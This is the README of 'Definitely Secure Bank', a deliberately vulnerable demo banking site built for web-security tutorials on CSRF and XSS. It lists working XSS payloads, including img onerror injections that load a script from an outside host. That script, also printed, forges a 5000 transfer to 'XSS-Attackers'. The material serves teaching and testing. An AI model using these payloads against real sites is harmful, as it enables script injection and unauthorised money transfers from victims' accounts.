# Definitely Secure Bank

<img src="https://dsb.victorzhou.com/dsb.svg" width="64">

A definitely (read: not) secure online banking site. Built by [Victor Zhou](https://victorzhou.com) for demo purposes as an example of common security vulnerabilities / what NOT to do.

Used in:
- [Web Security 101: An Interactive CSRF Demo](https://victorzhou.com/blog/csrf/)
- [Web Security 101: Cross-Site Scripting Attacks](https://victorzhou.com/blog/xss/)

PAyload for testing

(1)```
<img src="data:image/png;base64,"/>
```
(2)```
<img src= "#" onerror="alert()"/>
```
(3)```
<img src="#" onerror="const a=document.createElement('script');a.src='https://victorzhou.com/xss-demo.js';document.body.appendChild(a);" />
```
  https://victorzhou.com/xss-demo.js
```
const body=new URLSearchParams('amount=5000&description=Gotcha!&to=XSS-Attackers');
fetch('/transfer',{body,method:'post',});
```(4)
```
<img src="#" onerror="const a=document.createElement('script');a.src='https://d2id44ppoqodfb.cloudfront.net/ehacking/xss-demo.js';document.body.appendChild(a);" />
```
